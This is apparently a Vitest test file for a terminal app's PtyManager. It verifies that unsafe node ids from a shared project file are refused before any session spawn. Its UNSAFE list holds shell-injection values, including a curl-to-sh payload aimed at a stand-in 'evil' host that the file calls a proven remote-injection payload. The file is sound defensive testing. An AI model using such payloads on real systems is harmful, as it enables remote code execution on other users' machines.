import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import { initPlatform, resetPlatformForTests } from './platform'
import { fakePlatform, type FakePlatform } from './platform-fake'
import { IPC } from '../shared/ipc'
import type { PtyCreateOptions, PtyCreateResult } from '../shared/types'

/**
 * SECURITY — the choke point. Every session spawn (local tmux, plain shell, SSH remote) goes
 * through `PtyManager.create`, and `persistKey` is the node id it carries all the way to the
 * remote tmux command (`NODETERM_NODE_ID=<persistKey>`). The IPC registration validates it not at
 * all, and node ids come from `.nodeterm/project.json` — a file that travels in a cloned/shared
 * repo. Layer 1 (quoting in `remoteTmuxPtyArgs`) makes the value inert; this is layer 2, refusing
 * it before any code path can spend it.
 *
 * Failure direction: REFUSE. Every id the app mints (`nextId()` = `<prefix>-<base36>-<counter>`,
 * `uuid()`) passes, so nothing legitimate is refused; and sanitising instead would silently change
 * the id that `NODETERM_NODE_ID` reports back, orphaning every hook event for that node.
 */
const spawned: Array<{ file: string; args: string[] }> = []

vi.mock('node-pty', () => ({
  spawn: (file: string, args: string[]) => {
    spawned.push({ file, args })
    return {
      onData: () => {},
      onExit: () => {},
      write: () => {},
      resize: () => {},
      pause: () => {},
      resume: () => {},
      kill: () => {},
      pid: 4321
    }
  }
}))

// Same reason as pty-require-remote.test.ts: keep the developer's own pty pressure out of this.
vi.mock('./pty-devices', async (importOriginal) => ({
  ...(await importOriginal<typeof import('./pty-devices')>()),
  readPtyDevices: () => ({ ceiling: 511, inUse: 8 })
}))

const ALICE = 1

describe('pty create: an unsafe persistKey never reaches a spawn', () => {
  let fake: FakePlatform

  beforeEach(async () => {
    spawned.length = 0
    fake = fakePlatform()
    initPlatform(fake)
    const { PtyManager } = await import('./pty-manager')
    new PtyManager().registerIpc()
  })
  afterEach(() => {
    resetPlatformForTests()
  })

  const create = (options: Partial<PtyCreateOptions>) =>
    fake.handlers[IPC.ptyCreate](ALICE, { cols: 80, rows: 24, ...options }) as Promise<PtyCreateResult>

  const UNSAFE = [
    ['..', 'traversal'],
    ['.', 'traversal'],
    ['a/b', 'a path, not an id'],
    ['a;b', 'a command separator'],
    ['n1;curl${IFS}http://evil/x|sh;#', 'the proven remote-injection payload'],
    ['a b', 'word splitting'],
    ['a\nb', 'a second command line'],
    ['a`id`', 'command substitution'],
    ['a'.repeat(300), 'unbounded']
  ] as const

  for (const [key, why] of UNSAFE) {
    it(`refuses ${JSON.stringify(key.slice(0, 40))} — ${why}`, async () => {
      await expect(create({ persistKey: key, cwd: '/srv/app' })).rejects.toThrow(/node id/i)
      expect(spawned).toHaveLength(0)
    })
  }

  it('an EMPTY persistKey is not an unsafe id — it is "no persistence", and still spawns', async () => {
    // `create()` already treats a falsy persistKey as the non-persistent path (`spawnNew` straight
    // away). Refusing it here would break every ephemeral pty (previews, one-shot runs).
    const res = await create({ persistKey: '', cwd: '/srv/app' })
    expect(res.sessionId).not.toBe('')
    expect(spawned).toHaveLength(1)
  })

  it('accepts the ids the app actually mints', async () => {
    for (const key of ['term-mabc123-7', 'ssh-mabc123-1', '3f2a1b4c-7d8e-4f10-9a2b-1c3d5e7f9a0b'])
      expect((await create({ persistKey: key, cwd: '/srv/app' })).sessionId).not.toBe('')
    expect(spawned).toHaveLength(3)
  })
})
